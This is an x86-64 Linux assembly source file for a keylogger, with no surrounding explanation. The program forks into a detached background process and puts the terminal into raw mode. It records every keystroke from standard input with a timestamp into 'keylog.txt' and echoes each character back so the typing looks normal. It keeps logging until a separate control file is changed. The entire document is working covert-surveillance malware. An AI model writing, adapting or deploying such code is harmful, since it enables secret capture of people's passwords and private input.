section .data
    ; File paths
    log_file db "keylog.txt", 0
    ctrl_file db "k.ctrl", 0
    
    ; Messages
    start_msg db "Keylogger started", 10, 0
    start_len equ $ - start_msg
    
    ; Constants
    STDIN equ 0
    STDOUT equ 1
    TCGETS equ 0x5401
    TCSETS equ 0x5402
    
    ; File descriptors
    fd dq 0
    ctrl_fd dq 0

section .bss
    termios resb 60              ; Terminal settings
    orig_termios resb 60         ; Original terminal settings
    buf resb 8                   ; Input buffer
    time_buf resb 32             ; Buffer for timestamp
    tspec resq 2                 ; For clock_gettime
    
section .text
global _start

_start:
    ; Create control file
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 102o                ; O_CREAT | O_WRONLY
    mov rdx, 0644o               ; Permissions
    syscall
    
    cmp rax, 0
    jl exit
    
    mov [ctrl_fd], rax
    
    ; Write 0 to control file
    mov byte [buf], 0
    mov rax, 1                   ; sys_write
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; Close control file
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; Open log file
    mov rax, 2                   ; sys_open
    mov rdi, log_file
    mov rsi, 1102o               ; O_CREAT | O_WRONLY | O_APPEND
    mov rdx, 0644o               ; Permissions
    syscall
    
    cmp rax, 0
    jl exit
    
    mov [fd], rax
    
    ; Write startup message
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, start_msg
    mov rdx, start_len
    syscall
    
    ; Fork to create a child process
    mov rax, 57                  ; sys_fork
    syscall
    
    cmp rax, 0
    je child_process             ; Child process
    jg parent_process            ; Parent process
    jmp exit                     ; Error
    
child_process:
    ; Create a new session
    mov rax, 112                 ; sys_setsid
    syscall
    
    ; Get current terminal settings
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCGETS
    mov rdx, termios
    syscall
    
    ; Save original settings
    mov rcx, 60                  ; Size of termios
    mov rsi, termios
    mov rdi, orig_termios
    rep movsb
    
    ; Modify terminal settings
    ; Clear ECHO and ICANON flags (bits 1 and 3 in c_lflag)
    ; ECHO = 0x8, ICANON = 0x2
    mov eax, [termios+12]        ; c_lflag at offset 12
    and eax, ~0xA                ; Clear ECHO and ICANON bits
    mov [termios+12], eax
    
    ; Set c_cc[VMIN] = 1 (read at least one char)
    mov byte [termios+17], 1
    
    ; Set c_cc[VTIME] = 0 (no timeout)
    mov byte [termios+16], 0
    
    ; Apply new settings
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCSETS
    mov rdx, termios
    syscall
    
    ; Main loop - read and log keypresses
main_loop:
    ; Check control file
    mov rax, 2                   ; sys_open
    mov rdi, ctrl_file
    mov rsi, 0                   ; O_RDONLY
    mov rdx, 0
    syscall
    
    cmp rax, 0
    jl continue_loop
    
    mov [ctrl_fd], rax
    
    ; Read control byte
    mov rax, 0                   ; sys_read
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    mov rbx, rax                 ; Save bytes read
    
    ; Close control file
    mov rax, 3                   ; sys_close
    mov rdi, [ctrl_fd]
    syscall
    
    ; Check if we should exit
    cmp rbx, 1
    jne continue_loop
    cmp byte [buf], 0
    jne cleanup_exit
    
continue_loop:
    ; Read a keystroke
    mov rax, 0                   ; sys_read
    mov rdi, STDIN
    mov rsi, buf
    mov rdx, 1
    syscall
    
    cmp rax, 1                   ; Check if we read a character
    jne main_loop
    
    ; Get timestamp
    mov rax, 228                 ; sys_clock_gettime
    mov rdi, 0                   ; CLOCK_REALTIME
    mov rsi, tspec
    syscall
    
    ; Format timestamp
    mov rax, [tspec]             ; Seconds
    mov rcx, 0                   ; Digit count
    mov r8, 10                   ; Base 10
    lea rbx, [time_buf+19]       ; End of buffer
    mov byte [rbx], 0            ; Null terminator
    
    ; Convert to digits (in reverse)
ts_convert:
    dec rbx
    xor rdx, rdx
    div r8
    add dl, '0'
    mov [rbx], dl
    inc rcx
    test rax, rax
    jnz ts_convert
    
    ; Fill with leading zeros
    cmp rcx, 19
    jge ts_done
    
ts_fill:
    dec rbx
    mov byte [rbx], '0'
    inc rcx
    cmp rcx, 19
    jl ts_fill
    
ts_done:
    ; Write timestamp to log
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, rbx                 ; Start of formatted timestamp
    mov rdx, 20                  ; Length (including null)
    syscall
    
    ; Write separator
    mov byte [time_buf], ' '
    mov byte [time_buf+1], '|'
    mov byte [time_buf+2], ' '
    
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, time_buf
    mov rdx, 3
    syscall
    
    ; Write key
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall
    
    ; Write newline
    mov byte [time_buf], 10      ; Newline
    
    mov rax, 1                   ; sys_write
    mov rdi, [fd]
    mov rsi, time_buf
    mov rdx, 1
    syscall
    
    ; Echo character back to terminal
    mov rax, 1                   ; sys_write
    mov rdi, STDOUT
    mov rsi, buf
    mov rdx, 1
    syscall
    
    jmp main_loop
    
cleanup_exit:
    ; Restore original terminal settings
    mov rax, 16                  ; sys_ioctl
    mov rdi, STDIN
    mov rsi, TCSETS
    mov rdx, orig_termios
    syscall
    
    ; Close log file
    mov rax, 3                   ; sys_close
    mov rdi, [fd]
    syscall
    
    ; Exit
    jmp exit
    
parent_process:
    ; Parent just exits, leaving child in background
    
exit:
    mov rax, 60                  ; sys_exit
    xor rdi, rdi
    syscall